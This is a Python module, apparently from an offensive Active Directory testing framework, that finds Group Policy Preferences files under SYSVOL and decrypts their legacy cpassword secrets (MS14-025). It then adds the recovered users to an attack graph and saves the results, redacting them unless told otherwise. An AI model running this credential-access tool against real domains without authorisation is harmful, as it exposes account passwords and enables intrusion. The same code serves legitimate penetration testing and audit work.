"""GPP cpassword hunt — locate + decrypt legacy Group Policy Preferences secrets."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from rich.console import Console

from adaf_attack.core.gpp import iter_gpp_files, parse_gpp_file
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.redaction import redact
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="gpp-cpassword-hunt",
    summary="Discover and decrypt legacy GPP cpassword secrets under SYSVOL",
    category="credential-access",
    tags=("gpp", "sysvol", "cpassword", "ms14-025"),
)
class GppCpasswordHunt:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        source = kwargs.get("sysvol") or kwargs.get("path")
        if not source:
            raise RuntimeError(
                "Pass --param sysvol=<mounted-sysvol-path> "
                "or --param path=<local-directory-with-Groups.xml>."
            )
        root = Path(str(source)).expanduser()
        if not root.is_dir():
            raise RuntimeError(f"path is not a directory: {root}")

        console.print(f"[bold]GPP cpassword hunt[/bold] ← {root}")

        entries: list[dict[str, Any]] = []
        for path in iter_gpp_files(root):
            for record in parse_gpp_file(path):
                entries.append(record)
                if "plaintext" in record:
                    who = record.get("username", "?")
                    console.print(
                        f"  [green]decrypted[/green] {who} from {Path(record['file']).name}"
                    )
                    node = f"USER@{who.upper()}@{target.domain.upper()}"
                    graph.add_node(node, "User", sam=who, source="gpp")
                    graph.add_edge(node, node, "HasGppCpassword", file=record["file"])

        result: dict[str, Any] = {
            "domain": target.domain,
            "root": str(root),
            "count": len(entries),
            "decrypted": sum(1 for e in entries if "plaintext" in e),
            "entries": entries,
        }
        redacted = redact(result, include_secrets=include_secrets)

        out = session.path("gpp-cpassword.json")
        out.write_text(json.dumps(redacted, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "gpp-cpassword-hunt.complete",
            count=len(entries),
            decrypted=result["decrypted"],
            include_secrets=include_secrets,
        )
        console.print(
            f"[green]Done[/green]  files={len(entries)}  decrypted={result['decrypted']}"
        )
        console.print(f"Results → {out}")
        return dict(redacted) if isinstance(redacted, dict) else result
